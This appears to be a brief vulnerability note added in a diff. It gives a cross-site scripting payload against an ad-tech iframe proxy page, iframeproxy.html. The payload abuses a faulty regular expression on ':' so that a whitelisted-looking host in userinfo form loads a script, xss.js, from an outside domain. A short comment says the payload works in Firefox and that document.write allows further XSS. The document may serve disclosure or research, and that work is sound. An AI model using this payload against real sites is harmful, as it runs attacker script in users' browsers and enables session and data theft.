@@ -1,0 +1,3 @@
+/adtech/iframeproxy.html#https://pictela.net:aa@bgtian.life/xss.js|ifv|
+
+Work on firefox. use the bad regexp on ":" to simulate the login:password stuff. However, with a simple document.write, other XSS are possible
